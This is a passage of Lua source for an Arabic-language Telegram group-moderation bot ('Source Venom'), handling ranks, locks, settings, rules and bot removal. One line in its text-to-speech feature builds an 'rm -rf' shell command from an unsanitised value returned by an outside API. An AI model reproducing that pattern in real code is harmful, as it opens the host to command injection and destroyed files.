if tonumber(SetSpam) < 40 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙اختر عدد اكبر من 40 حرف ', 1, 'md')
else
DevAbs:set(Venom..'Abs:Spam:Text'..msg.chat_id_,SetSpam)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم وضع عدد السبام ↫'..SetSpam, 1, 'md')
end
end
end
--     Source Venom     --
if Manager(msg) then
if text == "فحص" or text == "فحص البوت" then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Venom)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙صلاحيات البوت هي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙حذف الرسائل ↫ '..DEL..'\n𖠧︙دعوة المستخدمين ↫ '..INV..'\n𖠧︙حظر المستخدمين ↫ '..BAN..'\n𖠧︙تثبيت الرسائل ↫ '..PIN..'\n𖠧︙تغيير المعلومات ↫ '..EDT..'\n𖠧︙اضافة مشرفين ↫ '..VIP..'\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
DevAbs:set(Venom.."Abs:SudoBot:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المطور الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
DevAbs:set(Venom.."Abs:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المنشئ الاساسي الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
DevAbs:set(Venom.."Abs:Constructor:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المنشئ الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
DevAbs:set(Venom.."Abs:Managers:Rd"..msg.chat_id_,Text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المدير الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
DevAbs:set(Venom.."Abs:Admins:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد الادمن الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
DevAbs:set(Venom.."Abs:VipMem:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المميز الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
DevAbs:set(Venom.."Abs:Cleaner:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد المنظف الى ↫ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
DevAbs:set(Venom.."Abs:mem:Rd"..msg.chat_id_,Text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تغير رد العضو الى ↫ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف جميع ردود الرتب", 1, 'md')
DevAbs:del(Venom.."Abs:mem:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:Cleaner:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:VipMem:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:Admins:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:Managers:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:Constructor:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:BasicConstructor:Rd"..msg.chat_id_)
DevAbs:del(Venom.."Abs:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Venom     --
if text == "كشف البوتات" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = '𖠧︙*قائمة البوتات* ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙*عدد البوتات هنا* ↫ '..n..'\n'
local f = '𖠧︙*عدد البوتات المرفوعه* ↫ '..t..'\n𖠧︙*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Dev_Abs(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(Venom) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتوجد بوتات هنا*", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*عدد البوتات هنا* ↫ "..c.."\n𖠧︙*عدد البوتات المرفوعه* ↫ "..x.."\n𖠧︙*تم طرد* ↫ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source Venom     --
end
--     Source Venom     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") or text and text:match("^مسح (.*)$") then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'الثانويين' or txtss[2] == 'الثانويين' or txts[2] == 'المطورين الثانويين' or txtss[2] == 'المطورين الثانويين' then
DevAbs:del(Venom..'Abs:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المطورين الثانويين")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevAbs:del(Venom..'Abs:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المطورين")  
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevAbs:del(Venom..'Abs:BanAll:')
DevAbs:del(Venom..'Abs:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قائمة العام")  
end
end
if SudoBot(msg) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف الادمنيه العامين")  
DevAbs:del(Venom..'Abs:AdminAll:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المميزين عام")  
DevAbs:del(Venom..'Abs:VipAll:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المدراء العامين")  
DevAbs:del(Venom..'Abs:ManagerAll:')
end
if txts[2] == 'المالكين' or txtss[2] == 'المالكين' then
DevAbs:del(Venom..'Abs:AbsConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,dp) 
local admins = dp.members_
for i=0 , #admins do
if dp.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevAbs:sadd(Venom.."Abs:AbsConstructor:"..msg.chat_id_,admins[i].user_id_)
end 
end  
end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المالكين")  
end
end
if AbsConstructor(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المنشئين الاساسيين")  
DevAbs:del(Venom..'Abs:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المنشئين")  
DevAbs:del(Venom..'Abs:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المدراء")  
DevAbs:del(Venom..'Abs:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المنظفين")  
DevAbs:del(Venom..'Abs:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف الادمنيه")  
DevAbs:del(Venom..'Abs:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'قوانين' or txtss[2] == 'قوانين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف القوانين")  
DevAbs:del(Venom..'Abs:rules'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المطايه")  
DevAbs:del(Venom..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف رابط المجموعه")  
DevAbs:del(Venom.."Abs:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المميزين")  
DevAbs:del(Venom..'Abs:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevAbs:del(Venom..'Abs:Muted:'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المكتومين")  
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local List = DevAbs:smembers(Venom..'Abs:Tkeed:'..msg.chat_id_)
for k,v in pairs(List) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_, v)
end 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف المقيدين")  
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قائمة المنع")  
DevAbs:del(Venom..'Abs:Filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قوائم المنع")  
DevAbs:del(Venom..'Abs:Filters:'..msg.chat_id_)
DevAbs:del(Venom.."Abs:FilterAnimation"..msg.chat_id_)
DevAbs:del(Venom.."Abs:FilterPhoto"..msg.chat_id_)
DevAbs:del(Venom.."Abs:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
DevAbs:del(Venom.."Abs:FilterAnimation"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قائمة منع المتحركات")  
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
DevAbs:del(Venom.."Abs:FilterPhoto"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قائمة منع الصور")  
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
DevAbs:del(Venom.."Abs:FilterSteckr"..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","𖠧︙تم حذف قائمة منع الملصقات")  
end
end
end
--     Source Venom     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمنشئ الاساسي فقط', 1, 'md')
else
DevAbs:del(Venom..'Abs:Ban:'..msg.chat_id_) DevAbs:del(Venom..'Abs:Admins:'..msg.chat_id_) DevAbs:del(Venom..'User:Donky:'..msg.chat_id_) DevAbs:del(Venom..'Abs:VipMem:'..msg.chat_id_) DevAbs:del(Venom..'Abs:Filters:'..msg.chat_id_) DevAbs:del(Venom..'Abs:Muted:'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف ↫ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source Venom     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not AbsConstructor(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمالكين فقط', 1, 'md')
else
local basicconstructor = DevAbs:smembers(Venom..'Abs:BasicConstructor:'..msg.chat_id_)
local constructor = DevAbs:smembers(Venom..'Abs:Constructor:'..msg.chat_id_)
local Managers = DevAbs:smembers(Venom..'Abs:Managers:'..msg.chat_id_)
local admins = DevAbs:smembers(Venom..'Abs:Admins:'..msg.chat_id_)
local vipmem = DevAbs:smembers(Venom..'Abs:VipMem:'..msg.chat_id_)
local donky = DevAbs:smembers(Venom..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
DevAbs:del(Venom..'Abs:BasicConstructor:'..msg.chat_id_)
DevAbs:del(Venom..'Abs:Constructor:'..msg.chat_id_)
DevAbs:del(Venom..'Abs:Managers:'..msg.chat_id_)
DevAbs:del(Venom..'Abs:Admins:'..msg.chat_id_)
DevAbs:del(Venom..'Abs:VipMem:'..msg.chat_id_)
DevAbs:del(Venom..'User:Donky:'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف جميع الرتب التاليه ↫ ❨ "..basicconstructort..constructort..Managerst..adminst..vipmemt..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source Venom     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not DevAbs:get(Venom..'Abs:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = DevAbs:get(Venom..'Abs:Spam:Text'..msg.chat_id_)
end
--     Source Venom     --
if DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source Venom     --
if DevAbs:get(Venom.."Abs:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevAbs:get(Venom.."Abs:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevAbs:get(Venom.."Abs:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source Venom     --
if DevAbs:get(Venom..'Abs:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevAbs:get(Venom..'Abs:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevAbs:get(Venom.."Abs:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevAbs:get(Venom..'Abs:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevAbs:get(Venom..'Abs:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevAbs:get(Venom..'Abs:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevAbs:get(Venom..'Abs:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevAbs:hget(Venom.."Abs:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Venom     --
local TXTE = "𖠧︙اعدادات المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
.."𖠧︙الروابط ↫ "..mute_links.."\n"
.."𖠧︙المعرف ↫ "..lock_tag.."\n"
.."𖠧︙البوتات ↫ "..lock_bots.."\n"
.."𖠧︙المتحركه ↫ "..mute_gifs.."\n"
.."𖠧︙الملصقات ↫ "..lock_sticker.."\n"
.."𖠧︙الملفات ↫ "..lock_file.."\n"
.."𖠧︙الصور ↫ "..mute_photo.."\n"
.."𖠧︙الفيديو ↫ "..mute_video.."\n"
.."𖠧︙الاونلاين ↫ "..mute_in.."\n"
.."𖠧︙الدردشه ↫ "..mute_text.."\n"
.."𖠧︙التوجيه ↫ "..lock_forward.."\n"
.."𖠧︙الاغاني ↫ "..mute_music.."\n"
.."𖠧︙الصوت ↫ "..mute_voice.."\n"
.."𖠧︙الجهات ↫ "..lock_contact.."\n"
.."𖠧︙الماركداون ↫ "..markdown.."\n"
.."𖠧︙الهاشتاك ↫ "..lock_htag.."\n"
.."𖠧︙التعديل ↫ "..mute_edit.."\n"
.."𖠧︙التثبيت ↫ "..lock_pin.."\n"
.."𖠧︙الاشعارات ↫ "..lock_tgservice.."\n"
.."𖠧︙الكلايش ↫ "..lock_spam.."\n"
.."𖠧︙الدخول ↫ "..lock_Join.."\n"
.."𖠧︙الشبكات ↫ "..lock_wp.."\n"
.."𖠧︙المواقع ↫ "..lock_location.."\n"
.."𖠧︙الفشار ↫ "..lock_fshar.."\n"
.."𖠧︙الكفر ↫ "..lock_kaf.."\n"
.."𖠧︙الطائفيه ↫ "..lock_taf.."\n"
.."𖠧︙العربيه ↫ "..lock_arabic.."\n"
.."𖠧︙الانكليزيه ↫ "..lock_english.."\n"
.."𖠧︙الفارسيه ↫ "..lock_farsi.."\n"
.."𖠧︙التكرار ↫ "..flood.."\n"
.."𖠧︙عدد التكرار ↫ "..Flood_Num.."\n"
.."𖠧︙عدد السبام ↫ "..spam_c.."\n"
.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙[Source Channel](https://t.me/venom_source)\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source Venom     --
if text and text:match("^كول (.*)$") then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abs(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     Source Venom     --
if DevAbs:get(Venom..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevAbs:del(Venom..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(Venom..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:rules'..msg.chat_id_,text)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي القوانين الان', 1, 'md')
DevAbs:set(Venom..'Abs:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") then
local rules = DevAbs:get(Venom..'Abs:rules'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source Venom     --
if text == 'رقمي' and SourceCh(msg) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.phone_number_  then
MyNumber = "𖠧︙رقمك ↫ +"..result.phone_number_
else
MyNumber = "𖠧︙رقمك موضوع لجهات اتصالك فقط"
end
send(msg.chat_id_, msg.id_,MyNumber)
end,nil)
end
--     Source Venom     --
if text == "تفعيل انطق" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل ميزة انطق'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Antk:Abs'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل ميزة انطق'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Antk:Abs'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevAbs:get(Venom..'Abs:Antk:Abs'..msg.chat_id_) and SourceCh(msg) then
local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
Antk = JSON.decode(UrlAntk)
if UrlAntk.ok ~= false then
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..Antk.result.translate..'.mp3')  
os.execute('rm -rf ./'..Antk.result.translate..'.mp3') 
end
end
--     Source Venom     --
if text == "تفعيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Zrf:Abs'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الزخرفه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Zrf:Abs'..msg.chat_id_,true)  
end
if DevAbs:get(Venom..'Zrf:Abs'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر الزخرفه', 1, 'md')
DevAbs:del(Venom..'Zrf:Abs'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
